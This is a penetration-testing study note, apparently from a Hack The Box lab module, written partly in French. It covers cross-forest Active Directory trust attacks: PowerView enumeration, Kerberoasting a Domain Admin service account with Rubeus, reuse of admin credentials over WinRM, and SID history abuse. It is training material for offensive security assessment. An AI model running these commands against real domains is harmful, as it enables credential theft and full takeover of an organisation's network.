# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

***

### <mark style="color:red;">Cross-Forest Kerberoasting</mark>

We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.

<mark style="color:green;">**Enumerating Accounts for Associated SPNs Using Get-DomainUser**</mark>

```powershell-session
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.

<mark style="color:green;">**Enumerating the mssqlsvc Account**</mark>

{% code fullWidth="true" %}
```powershell-session
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```
{% endcode %}

Let's perform a Kerberoasting attack across the trust using `Rubeus`. We run the tool as we did in the Kerberoasting section, but we include the `/domain:` flag and specify the target domain.

<mark style="color:green;">**Performing a Kerberoasting Attacking with Rubeus Using /domain Flag**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
{% endcode %}

***

### <mark style="color:red;">Admin Password Re-Use & Group Membership</mark>

Dans certains environnements où deux forêts sont liées par une confiance bidirectionnelle gérée par les mêmes administrateurs, si l’on parvient à compromettre le Domaine A en récupérant les mots de passe (en clair ou sous forme de hachages NTLM) d’un compte administrateur (qu’il s’agisse du compte intégré ou d’un compte membre des groupes Domain Admins/Enterprise Admins), et que le Domaine B possède un compte hautement privilégié portant le même nom, alors une réutilisation de mot de passe peut permettre d’obtenir des droits administratifs sur le Domaine B.\
De plus, il arrive que des utilisateurs ou administrateurs du Domaine A soient ajoutés aux groupes du Domaine B (seuls les Domain Local Groups acceptent des comptes externes). Ainsi, si vous compromettez un admin du Domaine A présent dans le groupe Administrators du Domaine B, vous obtiendrez un contrôle complet sur le Domaine B.\
Pour identifier ces appartenances « étrangères », la fonction PowerView **Get-DomainForeignGroupMember** peut être utilisée, comme dans l'exemple appliqué sur le domaine FREIGHTLOGISTICS.LOCAL.

<mark style="color:green;">**Using Get-DomainForeignGroupMember**</mark>

{% code fullWidth="true" %}
```powershell-session
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```
{% endcode %}

The above command output shows that the built-in Administrators group in `FREIGHTLOGISTICS.LOCAL` has the built-in Administrator account for the `INLANEFREIGHT.LOCAL` domain as a member. We can verify this access using the `Enter-PSSession` cmdlet to connect over WinRM.

<mark style="color:orange;">**Accessing DC03 Using Enter-PSSession**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell-session
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
{% endcode %}

From the command output above, we can see that we successfully authenticated to the Domain Controller in the `FREIGHTLOGISTICS.LOCAL` domain using the Administrator account from the `INLANEFREIGHT.LOCAL` domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.

***

### <mark style="color:red;">SID History Abuse - Cross Forest</mark>

L'historique des SID peut également être abusé à travers une relation d'approbation entre forêts. Si un utilisateur est migré d'une forêt à une autre et que le filtrage des SID n'est pas activé, il devient possible d'ajouter un SID provenant de l'autre forêt, et ce SID sera ajouté au jeton de l'utilisateur lors de l'authentification à travers l'approbation. Si le SID d'un compte disposant de privilèges administratifs dans la Forêt A est ajouté à l'attribut d'historique des SID d'un compte dans la Forêt B, et en supposant qu'ils puissent s'authentifier entre les forêts, alors ce compte disposera de privilèges administratifs lorsqu'il accède aux ressources de la forêt partenaire.

Dans le diagramme ci-dessous, nous pouvons voir un exemple de l'utilisateur **jjones** migré du domaine **INLANEFREIGHT.LOCAL** vers le domaine **CORP.LOCAL** dans une forêt différente. Si le filtrage des SID n'est pas activé lors de cette migration et que l'utilisateur possède des privilèges administratifs (ou tout autre type de droits intéressants tels que des entrées ACE, un accès aux partages, etc.) dans le domaine **INLANEFREIGHT.LOCAL**, alors il conservera ses droits d'administration/d'accès dans **INLANEFREIGHT.LOCAL** tout en étant membre du nouveau domaine **CORP.LOCAL** dans la seconde forêt.

![image](https://academy.hackthebox.com/storage/modules/143/sid-history.png)
